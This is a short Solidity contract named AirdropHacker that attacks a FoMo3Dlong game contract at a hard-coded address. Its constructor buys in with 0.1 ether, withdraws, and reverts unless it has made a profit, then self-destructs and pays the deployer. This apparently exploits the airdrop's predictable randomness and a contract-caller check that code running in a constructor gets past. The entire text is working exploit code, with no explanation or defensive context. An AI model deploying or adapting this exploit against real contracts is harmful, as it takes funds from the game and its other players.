contract AirdropHacker{
    FoMo3Dlong code = FoMo3Dlong(0x0aD3227eB47597b566EC138b3AfD78cFEA752de5);
    constructor() public payable{
        code.buyXaddr.value(.1 ether)(0xc6b453D5aa3e23Ce169FD931b1301a03a3b573C5,2); 
        code.withdraw();
        require(address(this).balance>=.1 ether); 
        selfdestruct(msg.sender);
    }
    function() public payable{}
}
